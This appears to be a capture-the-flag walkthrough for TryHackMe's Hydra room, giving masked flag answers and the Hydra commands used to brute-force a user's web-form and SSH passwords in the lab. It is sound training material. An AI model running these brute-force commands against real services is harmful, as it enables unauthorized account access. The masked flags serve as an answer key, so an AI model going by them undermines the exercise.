# TryHackMe Hydra
**Learn how to brute-force authentications services such as SSH and HTTP (POST).**

## Task-1 Hydra Introduction

1. Read the above and have Hydra at the ready.<br>
Answer : Read and submit

## Task-2 Using Hydra

1. Use Hydra to bruteforce molly's web password. What is flag 1?<br>
Answer : THM{2673****************************}
* This can be done by basic hydra command (*hydra -l molly -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V*) as given in description

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?<br>
Answer : THM{c8ee****************************}
* This can be done using command (*hydra -l molly -P rockyou.txt ssh -V*). You will get password as 'but******' and then login to ssh using this command (*ssh molly@IP*). Now 'ls' and 'cat' the flag.